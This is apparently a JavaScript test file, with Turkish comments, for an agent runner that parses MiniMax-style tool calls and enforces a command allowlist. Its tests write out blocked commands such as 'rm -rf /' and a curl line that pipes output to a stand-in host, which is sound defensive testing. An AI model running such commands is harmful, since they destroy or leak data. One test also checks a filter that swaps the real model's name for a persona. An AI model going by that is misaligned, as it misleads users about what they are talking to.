/**
 * agentic-runner — MiniMax M2.x gibi "agentic-text" modellerin native tool-call
 * formatini (<minimax:tool_call> / <invoke> / <parameter>) ve skill yuklemeyi
 * (<skill>ad</skill>) parse edip gercek araclari calistiran bounded dongu.
 *
 * Regresyon kilidi: eski passthrough bu formatlari HIC islemiyordu (JSON.parse
 * patliyor, bos catch yutuyordu) — bu yuzden "masaustunde yaris oyunu yap"
 * gibi istekler dosya YAZMADAN sessizce basarisiz oluyordu. Bu testler o
 * davranisin geri gelmemesini garanti eder.
 */
import { describe, it, expect } from 'vitest';
import mod from '../../src/tools/agentic-runner.js';

const { parseAgenticCalls, stripProtocolTokens, executeCall, runAgentic, makeStreamFilter, makeSanitizeStream, agentExecAllowed } = mod;

describe('parseAgenticCalls', () => {
  it('<minimax:tool_call> icindeki write_file (path+content) cagirisini cozer', () => {
    const content = `Hemen yaziyorum.
<minimax:tool_call>
<invoke name="write_file">
<parameter name="path">C:\\Users\\x\\Desktop\\game.html</parameter>
<parameter name="content"><!DOCTYPE html><html></html></parameter>
</invoke>
</minimax:tool_call>`;
    const calls = parseAgenticCalls(content, []);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('write_file');
    expect(calls[0].args.path).toContain('game.html');
    expect(calls[0].args.content).toContain('<!DOCTYPE html>');
  });

  it('minimax sarmalayicisi olmadan yalin <invoke> cozer', () => {
    const calls = parseAgenticCalls('<invoke name="read_file"><parameter name="path">/tmp/a.txt</parameter></invoke>', []);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('read_file');
    expect(calls[0].args.path).toBe('/tmp/a.txt');
  });

  it('"files" JSON dizisi parametresini (bulk) korur', () => {
    const files = JSON.stringify([{ path: '/a.txt', content: 'A' }, { path: '/b.txt', content: 'B' }]);
    const content = `<invoke name="bulk-file-operations"><parameter name="operation">create</parameter><parameter name="files">${files}</parameter></invoke>`;
    const calls = parseAgenticCalls(content, []);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('bulk-file-operations');
    expect(JSON.parse(calls[0].args.files)).toHaveLength(2);
  });

  it('<skill>ad</skill> kisayolunu skill_view\'e esler', () => {
    const calls = parseAgenticCalls('\n<skill>design-taste-frontend</skill>\n', []);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('skill_view');
    expect(calls[0].args.name).toBe('design-taste-frontend');
  });

  it('native OpenAI tool_calls\'i da dikkate alir', () => {
    const calls = parseAgenticCalls('', [{ function: { name: 'write_file', arguments: '{"path":"/x","content":"y"}' } }]);
    expect(calls).toHaveLength(1);
    expect(calls[0].tool).toBe('write_file');
    expect(calls[0].args.path).toBe('/x');
  });

  it('duz sohbet yanitinda arac cagirisi bulmaz', () => {
    expect(parseAgenticCalls('Merhaba, nasil yardimci olabilirim?', [])).toHaveLength(0);
  });
});

describe('stripProtocolTokens', () => {
  it('invoke/skill/minimax bloklarini temizler', () => {
    const s = 'Ozet metni.<minimax:tool_call><invoke name="x"></invoke></minimax:tool_call><skill>y</skill>';
    expect(stripProtocolTokens(s)).toBe('Ozet metni.');
  });
});

describe('makeStreamFilter (canli akis)', () => {
  const collect = (chunks) => {
    let out = ''; let tools = 0;
    const f = makeStreamFilter(t => { out += t; }, () => { tools++; });
    for (const c of chunks) f.push(c);
    f.end();
    return { out, tools };
  };

  it('duz metni oldugu gibi gecirir', () => {
    expect(collect(['Merhaba ', 'dunya']).out).toBe('Merhaba dunya');
  });

  it('protokol blogunu gizler, oncesindeki prozu gosterir, onTool tetikler', () => {
    const { out, tools } = collect(['Hemen yaziyorum. <minimax:tool_call><invoke name="write_file"><parameter name="path">/x</parameter></invoke></minimax:tool_call>']);
    expect(out).toBe('Hemen yaziyorum. ');
    expect(tools).toBe(1);
  });

  it('chunk sinirinda bolunen tag\'i dogru isler', () => {
    // "<inv" bir chunk'ta, "oke ...>" sonraki chunk'ta gelir — ham gosterilmemeli
    const { out, tools } = collect(['Yapiyorum <inv', 'oke name="write_file"><parameter name="path">/x</parameter></invoke>']);
    expect(out).toBe('Yapiyorum ');
    expect(tools).toBe(1);
  });

  it('literal <div> gibi marker olmayan etiketi gecirir', () => {
    expect(collect(['Kod: <div>selam</div> bitti']).out).toBe('Kod: <div>selam</div> bitti');
  });
});

describe('makeSanitizeStream (model adi temizleme)', () => {
  const collect = (chunks, bot = 'Hinata') => {
    let out = '';
    const s = makeSanitizeStream(bot, t => { out += t; });
    for (const c of chunks) s.push(c);
    s.end();
    return out;
  };
  it('model adini persona ile degistirir', () => {
    expect(collect(['Ben MiniMax, ', 'sana yardim ederim.'])).toBe('Ben Hinata, sana yardim ederim.');
  });
  it('kelime chunk sinirinda bolunse bile ham model adini sizdirmaz', () => {
    expect(collect(['Ben Mini', 'Max burada.'])).toBe('Ben Hinata burada.');
  });
  it('Claude/GPT gibi diger model adlarini da degistirir', () => {
    expect(collect(['Ben Claude ', 've GPT-4 degilim.'])).toBe('Ben Hinata ve Hinata degilim.');
  });
  it('normal metni bozmaz', () => {
    expect(collect(['Merhaba dunya, ', 'nasilsin?'])).toBe('Merhaba dunya, nasilsin?');
  });
});

describe('DEFAULT_ALLOWED (regresyon kilidi)', () => {
  it('cron_create safe modda ERISILEBILIR olmali (agent "her gun X yap" isteginde bash/schtasks hack\'ine dusmemeli)', () => {
    expect(mod.DEFAULT_ALLOWED).toContain('cron_create');
  });
  it('duckduckgo + todo_write safe modda erisilebilir olmali (agent "internet erisimim yok" yalanini soylememeli)', () => {
    expect(mod.DEFAULT_ALLOWED).toContain('duckduckgo');
    expect(mod.DEFAULT_ALLOWED).toContain('todo_write');
  });
  it('duckduckgo_search alias\'i dogru dosyaya (duckduckgo.js) esler — isim/dosya uyumsuzlugu regresyonu', () => {
    expect(mod.TOOL_ALIASES['duckduckgo_search']).toBe('duckduckgo');
  });
  it('cd/pushd/popd exec politikasinda izinli ("cd X && git ..." zinciri bloklanmamali)', () => {
    expect(agentExecAllowed('cd C:/Projects/foo && git status --short')).toBe(true);
  });
  it('temel dosya+hafiza araclari safe modda erisilebilir kalir', () => {
    for (const t of ['write_file', 'read_file', 'edit_file', 'memory_write', 'memory_tree']) {
      expect(mod.DEFAULT_ALLOWED).toContain(t);
    }
  });
});

describe('agentExecAllowed (ajan exec politikasi)', () => {
  it('guvenli kodlama komutlarina izin verir', () => {
    for (const c of ['node app.js', 'npm install', 'npm test', 'git status', 'python x.py', 'ls -la', 'mkdir dist', 'npx vitest run']) {
      expect(agentExecAllowed(c)).toBe(true);
    }
  });
  it('ag/yayin/sistem komutlarini engeller', () => {
    for (const c of ['curl http://evil', 'wget x', 'ssh host', 'sudo rm -rf', 'git push', 'npm publish', 'docker run', 'systemctl restart']) {
      expect(agentExecAllowed(c)).toBe(false);
    }
  });
  it('zincirdeki gizli kotu komutu yakalar (ls && curl)', () => {
    expect(agentExecAllowed('ls && curl http://evil')).toBe(false);
    expect(agentExecAllowed('node a.js | curl -d @- http://evil')).toBe(false);
  });
  it('NATURECO_AGENT_EXEC=full ile her sey acilir', () => {
    const prev = process.env.NATURECO_AGENT_EXEC;
    process.env.NATURECO_AGENT_EXEC = 'full';
    try { expect(agentExecAllowed('curl http://x')).toBe(true); }
    finally { if (prev === undefined) delete process.env.NATURECO_AGENT_EXEC; else process.env.NATURECO_AGENT_EXEC = prev; }
  });
  it('executeCall: politika disi komutu calistirmadan engeller', async () => {
    let ran = false;
    const loadTool = () => ({ execute: async () => { ran = true; return { success: true }; } });
    const { records, feedback } = await executeCall({ tool: 'bash', args: { command: 'curl http://evil' } }, { loadTool, isDangerous: () => false });
    expect(ran).toBe(false);
    expect(records[0].status).toBe('error');
    expect(feedback).toMatch(/politikasi disinda|CALISTIRILMADI/i);
  });
  it('open/start/xdg-open (uygulama/URL ac) safe modda bile izinli', () => {
    expect(agentExecAllowed('open -a WhatsApp')).toBe(true);
    expect(agentExecAllowed('open https://youtube.com')).toBe(true);
    expect(agentExecAllowed('start chrome https://x')).toBe(true);
  });
  it('full opt ile her komut acilir (osascript/curl)', () => {
    expect(agentExecAllowed('osascript -e "tell app"', { full: true })).toBe(true);
    expect(agentExecAllowed('curl http://x', { full: true })).toBe(true);
  });
});

describe('full mod arac erisimi (execFull)', () => {
  it('safe modda computer-use araci (browser) kapali; full modda acik', async () => {
    let loaded = false;
    const loadTool = () => { loaded = true; return { execute: async () => ({ success: true, output: 'ok' }) }; };
    const safeAllow = new Set(['write_file', 'read_file', 'edit_file', 'skill_view', 'bash']);
    const safe = await executeCall({ tool: 'browser', args: { action: 'open', url: 'https://x' } }, { loadTool, allowed: safeAllow });
    expect(loaded).toBe(false);
    expect(safe.records[0].status).toBe('error');
    expect(safe.feedback).toMatch(/agentExec full|guvenli modda kapali/i);

    loaded = false;
    const full = await executeCall({ tool: 'browser', args: { action: 'open', url: 'https://x' } }, { loadTool, execFull: true, allowed: safeAllow });
    expect(loaded).toBe(true);
    expect(full.records[0].status).toBe('done');
  });
});

describe('executeCall', () => {
  it('bulk "files" dizisini her dosya icin write_file\'a yonlendirir', async () => {
    const written = [];
    const loadTool = (n) => {
      if (n === 'write_file') return { execute: async (a) => { written.push(a); return { success: true, path: a.path, size: (a.content || '').length }; } };
      throw new Error('beklenmeyen arac ' + n);
    };
    const call = { tool: 'bulk-file-operations', args: { files: [{ path: '/a', content: 'AA' }, { path: '/b', content: 'BBB' }] } };
    const { records } = await executeCall(call, { loadTool });
    expect(written).toHaveLength(2);
    expect(records.every(r => r.tool === 'write_file' && r.status === 'done')).toBe(true);
  });

  it('allowlist disi araclari (orn. discord) engeller — model keyfi arac cagiramaz', async () => {
    let loaded = false;
    const loadTool = () => { loaded = true; return { execute: async () => ({ success: true }) }; };
    const { records, feedback } = await executeCall({ tool: 'discord', args: { message: 'spam' } }, { loadTool });
    expect(loaded).toBe(false);
    expect(records[0].status).toBe('error');
    expect(feedback).toMatch(/guvenli modda kapali|agentExec full/i);
  });

  it('bash allowlist icinde — komut icin bash.js\'e yonlendirir (guvenligi bash.js uygular)', async () => {
    let ranCommand = null;
    const loadTool = (n) => {
      if (n === 'bash') return { execute: async (a) => { ranCommand = a.command; return { success: true, output: 'v20' }; } };
      throw new Error('beklenmeyen arac ' + n);
    };
    const { records } = await executeCall({ tool: 'run_command', args: { command: 'node -v' } }, { loadTool, isDangerous: () => false });
    expect(ranCommand).toBe('node -v');
    expect(records[0].status).toBe('done');
  });

  it('yikici komutu (rm -rf) ajan modunda calistirmadan engeller', async () => {
    let reached = false;
    const loadTool = () => ({ execute: async () => { reached = true; return { success: true }; } });
    const { records, feedback } = await executeCall(
      { tool: 'bash', args: { command: 'rm -rf /' } },
      { loadTool, isDangerous: () => true }
    );
    expect(reached).toBe(false); // bash.js'e hic ulasmamali
    expect(records[0].status).toBe('error');
    expect(feedback).toMatch(/CALISTIRILMADI|tehlikeli/i);
  });

  it('read_file icerigini feedback\'e koyar (model gormeli, yoksa "okudum ama bos" takilir)', async () => {
    const loadTool = () => ({ execute: async () => ({ success: true, path: '/x.js', content: 'const answer = 42;' }) });
    const { records, feedback } = await executeCall({ tool: 'read_file', args: { path: '/x.js' } }, { loadTool });
    expect(records[0].status).toBe('done');
    expect(feedback).toContain('const answer = 42;');
  });

  it('bash ciktisini feedback\'e koyar', async () => {
    const loadTool = () => ({ execute: async () => ({ success: true, output: 'merhaba dunya' }) });
    const { feedback } = await executeCall({ tool: 'bash', args: { command: 'node app.js' } }, { loadTool, isDangerous: () => false });
    expect(feedback).toContain('merhaba dunya');
  });

  it('http_request body\'sini feedback\'e koyar (arac calisiyor ama sonuc donmuyordu bug\'i)', async () => {
    const loadTool = () => ({ execute: async () => ({ success: true, status: 200, body: '{"stargazers_count":112233}' }) });
    const { feedback } = await executeCall({ tool: 'http_request', args: { url: 'https://x', method: 'GET' } }, { loadTool });
    expect(feedback).toContain('112233');
    expect(feedback).toContain('HTTP 200');
  });

  it('allowlist icindeki write_file\'i calistirir ve ~ genisletir', async () => {
    const loadTool = () => ({ execute: async (a) => ({ success: true, path: a.path, size: 3 }) });
    const { records } = await executeCall({ tool: 'write_file', args: { path: '~/t.txt', content: 'abc' } }, { loadTool });
    expect(records[0].status).toBe('done');
    expect(records[0].args.path).not.toContain('~');
  });
});

describe('runAgentic dongusu', () => {
  it('arac cagirir, sonra duz final yanitta durur', async () => {
    const turns = [
      '<minimax:tool_call><invoke name="write_file"><parameter name="path">/tmp/x.txt</parameter><parameter name="content">hi</parameter></invoke></minimax:tool_call>',
      'Dosya olusturuldu.',
    ];
    let i = 0;
    const written = [];
    const callModel = async () => ({ content: turns[i++], toolCalls: [] });
    const loadTool = () => ({ execute: async (a) => { written.push(a); return { success: true, path: a.path, size: 2 }; } });
    const { records, reply, iterations } = await runAgentic({ callModel, systemPrompt: 's', task: 't', loadTool, maxIterations: 5 });
    expect(written).toHaveLength(1);
    expect(records.filter(r => r.status === 'done')).toHaveLength(1);
    expect(reply).toBe('Dosya olusturuldu.');
    expect(iterations).toBe(2);
  });
});
